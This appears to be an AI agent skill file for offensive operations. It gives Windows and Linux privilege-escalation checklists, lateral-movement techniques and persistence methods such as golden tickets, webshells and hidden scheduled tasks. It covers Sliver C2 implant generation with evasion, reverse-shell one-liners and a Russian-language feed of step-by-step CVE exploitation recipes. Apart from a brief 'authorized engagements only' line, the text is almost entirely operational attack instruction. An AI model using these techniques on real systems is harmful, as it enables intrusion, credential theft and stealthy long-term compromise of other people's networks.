---
name: privesc-lateral-persistence
description: Privilege escalation checklists for Windows and Linux, lateral movement with hop discipline, implant and C2 generation, and documented persistence mechanisms. Use after every foothold and on every new host.
---
SCOPE: authorized engagements only (lab / CTF / explicitly authorized targets). Follow the mission ROE and scope allow-list at all times.

On EVERY new host: privesc and credential harvesting BEFORE lateral movement; 1-2 documented persistence mechanisms per host.

---

## Privilege escalation checklists

## Windows (check in order)
1. whoami /priv → SeImpersonate/SeAssignPrimaryToken → potato family (GodPotato/SweetPotato) → SYSTEM.
2. Unquoted service paths, services with writable binary/config.
3. AlwaysInstallElevated (HKLM+HKCU \SOFTWARE\Policies\Microsoft\Windows\Installer), registry autologon creds, cmdkey /list → runas /savecred.
4. Kernel exploits ONLY if patch level is clearly old: PrintNightmare (CVE-2021-1675), HiveNightmare (SAM collection), SerpentPotato.
5. Scheduled tasks running as SYSTEM with writable action.
6. Always check: writable paths in service configs, DLL search order hijack candidates.

## Linux
1. sudo -l → GTFOBins vector.
2. SUID/SGID: find / -perm -4000 -type f 2>/dev/null; capabilities: getcap -r / 2>/dev/null.
3. Writable /etc/passwd (append user with known hash), cron jobs from root with writable scripts.
4. Docker/lxd group → host escape (mount host fs in privileged container).
5. Kernel exploits: last resort only.
6. PATH hijack if writable dir precedes legit path in scripts run by root.

## Rule
Privesc on EVERY new host is mandatory before lateral movement. Do not move on with low privileges if an elevation vector exists.

---

## Lateral movement

## Windows Domain
- Pass-the-Hash (SMB/WMI): psexec-style via SMB with NTLM hash.
- Pass-the-Ticket / overpass-the-hash (Rubeus/mimikatz-style): request TGT from hash → inject → access services.
- WinRM: Enter-PSSession -ComputerName <host> -Credential <cred> (or with stolen session).
- DCOM, scheduled task push, PsExec-style service install.

## Target Priority (within scope + hop limit)
DC → servers with admin privileges → admin workstations.

## Linux
- SSH with harvested keys/creds, password reuse across hosts.
- NFS exports, shared credentials in configs.

## Cloud
- Assume-role chains with stolen tokens, console access via stolen cookies/sessions.

## On EVERY New Host (mandatory sequence)
1. Deploy implant.
2. Privesc.
3. Credential harvesting.
4. THEN consider next hop (respect the hop limit).

---

## Persistence mechanisms

## Selection: 1–2 mechanisms per host (NOT all at once — noisy)

### Windows
- Scheduled task (disguised as legitimate task name/paths).
- Registry Run key.
- WMI event subscription.
- COM hijack, DLL search order hijack, service.
- Startup folder for low-priv persistence.

### Linux
- Cron, authorized_keys (own key), systemd unit/timer, webshell on compromised web server.

### Domain
- Golden ticket (krbtgt hash), DCSync rights, ACL-based backdoors (e.g., grant DA to controlled user).

### C2
- Implant with auto-reconnect + dead man's switch: no check-in for N minutes → self-destruct.

## Documentation
EVERY persistence mechanism must be documented: host, type, location, cleanup status. This feeds the final report and cleanup phase.

---

## Implants, C2, payload generation

## C2 — Sliver (primary), fallback: Mythic/Havoc
- Generate per-target: Windows → .exe/shellcode, Linux → ELF.
- Sliver session:
  sliver > generate --os windows --http <c2domain> --skip-symbols --evasion
  sliver > https --domain <c2domain> (listener)
- Profile: HTTPS mTLS, beacon 5–15 min, jitter 30–60%.
- Channel priority: HTTPS → DNS → ICMP (when egress is filtered).
- C2 domain: legitimate-looking, malleable profile mimicking Chrome update / Windows Update / CDN traffic.

## Payload Wrapping
- donut (shellcode from .NET PE), sRDI (shellcode from DLL), in-memory execution — nothing extra on disk.
- One-off dropper: after successful implant check-in → self-delete dropper file.
- EVERY build is unique (polymorphism): never reuse one implant binary across hosts. Regenerate per target.

## Reverse Shell (fallback, no C2 yet)
Linux: bash -i >& /dev/tcp/<ip>/<port> 0>&1
Filtered egress: mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f
ICMP shell when TCP/UDP fully blocked.
Windows PowerShell TCP client (one-liner), then upgrade to implant at first opportunity.
Encrypted: openssl s_client or socat with TLS.

## Rule
After ANY shell: immediately assess. If C2 reachable → upgrade to implant. Reverse shell is a temporary measure only.

## Эксплойт-фид 2026-11-26 (research-проход #1)

### CVE-2025-32463 — sudo chroot LPE
- Фингерпринт: `sudo --version` → 1.9.14–1.9.17 без дистро-бэкпорта (сверить с USN/errata).
- Форма: локальный запуск `sudo -R <fake_root> <cmd>` с `etc/nsswitch.conf` = `passwd: /woot1337` внутри fake_root и `libnss_/woot1337.so.2`.
- Гейт: локальный shell, glibc/NSS-система; права в sudoers НЕ нужны (NSS грузится до проверки sudoers).
- gcc не обязателен — тащим прекомпилированный .so (zinzloun/CVE-2025-32463).
- Подводные камни: sudo логирует попытки; stage в /tmp; EDB/auditd видят загрузку libnss_.
- Клинап: `rm -rf /tmp/sudowoot.stage.*`; проверить authlog.

### CVE-2025-6019 (+6018) — udisks/libblockdev LPE
- Фингерпринт: udisks2 установлен (default на большинстве дистро); libblockdev < июньских патчей 2025; на *SUSE 15 — pam_env читает ~/.pam_environment.
- Форма: `udisksctl loop-setup --file xfs.image --no-user-interaction` → D-Bus `UDisks2.Filesystem.Resize 0 '{}'` → busy-loop держит монтаж → `/tmp/blockdev*/bash -p`.
- Гейт allow_active: физическая сессия, угнанная сессия, либо цепочка CVE-2025-6018 (`XDG_SEAT=seat0`, `XDG_VTNR=1` в ~/.pam_environment + relogin по ssh).
- Подводные камни: убить gvfs-udisks2-volume-monitor; SLES — проверять CanSuspend; XFS-образ 300МБ.
- Клинап: `udisksctl loop-delete --block-device /dev/loopN`, kill busy-loop PID, rm gdbus_output.txt.

### CVE-2026-31431 «Copy Fail» — kernel LPE (KEV)
- Фингерпринт: ядро с коммитом 72548b093ee3 (2017) и без фикса a664bf3d603d (апрель 2026); тест — AF_ALG bind `authencesn(hmac(sha256),cbc(aes))` из непривилегированного шелла.
- Форма: 732-байтный python (os.splice в AF_ALG, MSG_MORE), детерминированная 4-байтовая запись в page cache /usr/bin/su, затем `su`.
- Гейты: python3.10+ (или Go-реимпл badsectorlabs/copyfail-go); в контейнерах seccomp часто режет AF_ALG — проверять заранее.
- Подводные камни: KEV (добавлен 2026-05-01) — телеметрия на authencesn; on-disk checksums не меняются (стелс), но ревёрт после ребута.
- Клинап: сам не нужен; при ошибке — перезагрузка цели восстанавливает page cache.

### AD CS ESC16 — SID extension отключён на CA
- Фингерпринт: `certipy find` — у CA глобально нет szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) в выданных сертах; `openssl x509 -text` без этого OID.
- Форма: `certipy req -ca CORP-CA -template <любой client-auth> -upn administrator@corp.local -sid S-1-5-21-...-500` → `certipy auth -pfx administrator.pfx`.
- Гейты: слабый маппинг сертов (StrongCertificateBindingEnforcement<2 / без май2022) либо комбо ESC6/ESC9; право зачисления на client-auth шаблон.
- Подводные камни: каждый Request ID пишется в БД CA; при наличии SID-extension метод молча фейлится.
- Клинап: отозвать выданный серт, зачистить .pfx; аудит Issued Logs.
